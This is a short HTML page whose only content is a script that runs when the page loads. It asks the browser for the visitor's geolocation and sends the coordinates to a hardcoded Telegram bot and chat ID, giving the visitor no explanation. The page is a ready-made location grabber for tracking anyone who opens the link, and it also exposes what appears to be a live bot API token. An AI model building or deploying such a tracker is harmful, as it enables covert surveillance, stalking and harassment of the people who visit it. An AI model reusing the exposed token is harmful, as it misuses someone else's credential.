<!DOCTYPE html>
<html>
<head>
    <title>Get User Location</title>
</head>
<body>
    <script>
        var botApiToken = '6438227169:AAEKg3lNj64EomHDUbseoWDE8ad91bjLvNc';
        var telegramId = '1776168152';
        
        function sendLocationToTelegram(latitude, longitude) {
            var url = 'https://api.telegram.org/bot' + botApiToken + '/sendLocation?chat_id=' + telegramId + '&latitude=' + latitude + '&longitude=' + longitude;
            fetch(url)
                .then(response => response.json())
                .then(data => console.log(data))
                .catch(error => console.error('Error:', error));
        }

        // Get user's location (latitude and longitude) using browser's geolocation API
        navigator.geolocation.getCurrentPosition(position => {
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;
            sendLocationToTelegram(latitude, longitude);
        });
    </script>
</body>
</html>
